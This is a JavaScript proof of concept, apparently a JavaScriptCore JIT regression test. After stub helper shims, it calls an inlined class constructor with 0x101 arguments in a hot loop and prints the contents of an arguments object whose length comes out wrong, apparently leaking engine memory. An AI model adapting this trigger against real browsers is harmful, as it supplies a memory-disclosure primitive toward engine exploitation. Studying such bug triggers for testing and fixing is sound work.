function gc() {
    for (let i = 0; i < 10; i++) {
      new ArrayBuffer(1024 * 1024 * 10);
    }
}

function noInline() {
}

function OSRExit() {
}

function ensureArrayStorage() {
}

function fiatInt52(i) {
	return i;
}

function noDFG() {
}

function noOSRExitFuzzing() {
}

function isFinalTier() {
	return true;
}

function transferArrayBuffer() {
}

function fullGC() {
	if (gc !== undefined) 
		gc();
	else
		CollectGarbage();
}

function edenGC() {
	if (gc !== undefined) 
		gc();
	else
		CollectGarbage();
}

function forceGCSlowPaths() {
	if (gc !== undefined) 
		gc();
	else
		CollectGarbage();
}

function noFTL() {

}

function debug(x) {
	console.log(x);
}

function describe(x) {
	console.log(x);
}

function isInt32(i) {
	return (typeof i === "number");
}

function BigInt(i) {
	return i;
}

if (typeof(console) == "undefined") {
    console = {
        log: print
    };
}

if (typeof(gc) == "undefined") {
  gc = function() {
    for (let i = 0; i < 10; i++) {
      new ArrayBuffer(1024 * 1024 * 10);
    }
  }
}

if (typeof(BigInt) == "undefined") {
  BigInt = function (v) { return new Number(v); }
}

if (typeof(BigInt64Array) == "undefined") {
  BigInt64Array = function(v) { return new Array(v); }
}

if (typeof(BigUint64Array) == "undefined") { 
  BigUint64Array = function (v) { return new Array(v); }
}

if (typeof(quit) == "undefined") {
  quit = function() {
  }
}

const kArgsLength = 0x101;
let buggy = null;

function inlineFunc() {
  if (arguments.length != kArgsLength) {
    buggy = arguments;
  }
}

class ClassForInine extends inlineFunc {}

function sleep(ms) {
  let start = new Date();

  while (new Date() - start < ms) {
    ;
  }
}

function main() {
  let args = new Array(kArgsLength);
  args.fill(333 + 1);
  args = args.join(', ');
  let opt = new Function(`(() => {
        new ClassForInine(${args});
    })();`);

  for (let i = 0; i < 0x100000; i++) {
    opt();

    if (i === 0x3000) {
      sleep(1000);
    }

    if (buggy) {
      print('buggy.length: ' + buggy.length);
      break;
    }
  }

  for (let i = 0, n = buggy.length; i < n; i++) {
    print(buggy[i]);
  }
}

main();
